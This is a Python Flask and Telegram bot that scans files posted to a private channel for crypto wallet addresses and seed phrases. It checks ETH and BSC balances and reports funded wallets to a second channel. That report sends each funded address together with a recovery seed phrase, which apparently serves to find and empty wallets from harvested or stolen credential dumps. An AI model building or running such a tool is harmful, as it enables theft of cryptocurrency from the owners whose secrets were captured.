import os
import re
import logging
import asyncio
import queue
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1004337084974

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

request_config = HTTPXRequest(
    connection_pool_size=40,
    pool_timeout=60.0,
    connect_timeout=30.0,
    read_timeout=60.0
)
bot = Bot(token=BOT_TOKEN, request=request_config)

app = Flask(__name__)

# صف فایل‌ها
file_queue = queue.Queue()
is_processing = False

def get_wallet_total(address: str) -> dict:
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 6}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except:
            continue
    return totals

async def process_one_file(doc):
    try:
        logging.info(f"=== Processing: {doc.file_name} ===")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        # استخراج تعداد تست از نام فایل یا محتوا
        test_count_match = re.search(r"تعداد تست[:\s]*(\d+)", text) or re.search(r"(\d{6,})", doc.file_name)
        test_id = test_count_match.group(1) if test_count_match else "نامشخص"

        addresses = list(set(re.findall(r"0x[a-fA-F0-9]{40}", text)))
        logging.info(f"File {doc.file_name} | Test ID: {test_id} | Addresses: {len(addresses)}")

        if not addresses:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ فایل `{doc.file_name}` آدرس معتبری نداشت.")
            return

        # استخراج سیدها
        seeds = re.findall(r"(?:[a-z]+(?:\s+[a-z]+){11,23})", text, re.IGNORECASE)
        seeds = list(set([s.strip() for s in seeds if len(s.split()) in (12, 15, 18, 21, 24)]))

        file_totals = {'ETH': 0.0, 'BSC': 0.0}
        rich_wallets = []

        # اسکن همه آدرس‌ها با worker محدود
        with ThreadPoolExecutor(max_workers=8) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr in addresses]
            results = await asyncio.gather(*tasks)

        for addr, res in zip(addresses, results):
            total = res['ETH'] + res['BSC']
            if total > 0.00001:
                rich_wallets.append((addr, res))
            file_totals['ETH'] += res['ETH']
            file_totals['BSC'] += res['BSC']

        # گزارش کلی
        report = (
            f"📊 **گزارش فایل**\n"
            f"📄 فایل: `{doc.file_name}`\n"
            f"🔢 شناسه تست: `{test_id}`\n"
            f"🔢 تعداد ولت: `{len(addresses)}`\n"
            f"──────────────────\n"
            f"**مجموع موجودی‌ها:**\n"
            f"🔹 ETH: `{file_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{file_totals['BSC']:.6f}`\n"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=report, parse_mode='Markdown')

        # گزارش جداگانه برای ولت‌های دارای موجودی
        if rich_wallets:
            for addr, bal in rich_wallets:
                msg = f"💰 **ولت دارای موجودی**\n`{addr}`\n"
                if bal['ETH'] > 0:
                    msg += f"• ETH: `{bal['ETH']:.6f}`\n"
                if bal['BSC'] > 0:
                    msg += f"• BSC: `{bal['BSC']:.6f}`\n"
                if seeds:
                    msg += f"\n🔑 Seed:\n`{seeds[0]}`"
                await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
                await asyncio.sleep(0.5)  # جلوگیری از flood

        logging.info(f"=== Finished: {doc.file_name} ===")

    except Exception as e:
        logging.error(f"Error processing {doc.file_name}: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا در `{doc.file_name}`:\n`{str(e)[:200]}`")
        except:
            pass

def worker():
    global is_processing
    while True:
        doc = file_queue.get()
        if doc is None:
            break
        is_processing = True
        try:
            asyncio.run(process_one_file(doc))
        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            is_processing = False
            file_queue.task_done()

# شروع worker
threading.Thread(target=worker, daemon=True).start()

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot)

    if update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            file_queue.put(update.channel_post.document)
            logging.info(f"File added to queue: {update.channel_post.document.file_name} | Queue size: {file_queue.qsize()}")

    return "OK"

@app.route('/')
def health():
    return f"Bot is running | Queue: {file_queue.qsize()} | Processing: {is_processing}"
